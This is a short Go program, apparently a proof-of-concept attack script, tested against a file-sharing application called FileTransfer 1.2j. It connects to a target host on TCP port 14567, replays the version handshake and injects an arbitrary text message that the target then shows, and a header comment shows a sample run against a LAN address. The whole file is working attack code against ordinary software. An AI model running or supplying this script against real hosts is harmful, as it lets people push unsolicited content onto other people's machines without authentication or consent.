/*
Tested against FileTransfer 1.2.j

mc@vato:/tmp$ go run cdc_filetransfer_message.go -target "192.168.2.130"
[*] Got version: 1.2j
[*] Sending 'WTF!!' to host '192.168.2.130'...
*/
 
package main

import (  
  "strconv"
  "fmt"
  "net"
  "flag"
  "os"
)

func main() {

var target = flag.String("target","localhost" ,"The host to send the message to.")
var note   = flag.String("message","WTF!!","The message to send.")

flag.Parse()

data := *note + "\x00"
message := "\x04" + strconv.Itoa(len(data)) + data 

conn, err := net.Dial("tcp", *target + ":14567")

if err != nil {
 println("[!] Socket Failed:", err.Error())
 os.Exit(1)
}

reply := make([]byte, 4)
_, err = conn.Read(reply)
println("[*] Got version:", string(reply))
fmt.Fprintf(conn, string(reply))
fmt.Fprintf(conn, "\x00\x00\x00\x00")
fmt.Printf("[*] Sending '%s' to host '%s'...\n", *note, *target)
fmt.Fprintf(conn, message)
}
